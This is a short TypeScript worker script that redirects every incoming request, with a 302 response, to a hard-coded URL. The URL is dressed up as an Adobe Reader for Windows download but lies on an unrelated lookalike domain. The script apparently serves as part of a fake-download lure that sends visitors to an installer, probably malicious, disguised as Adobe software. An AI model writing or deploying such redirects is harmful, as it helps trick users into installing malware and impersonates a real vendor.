// redirect.ts

// Define the redirect URL
const redirectUrl = "https://get.adobe.download.netvigatol.com/reader-download-os-Windows-10-name-Reader-2025-001-20997-English-for-Windows/"; // Replace with the URL you want to redirect to

// Handle the request
addEventListener("fetch", (event) => {
  event.respondWith(
    new Response(null, {
      status: 302, // HTTP status for redirection
      headers: {
        "Location": redirectUrl, // The URL to redirect to
      },
    })
  );
});
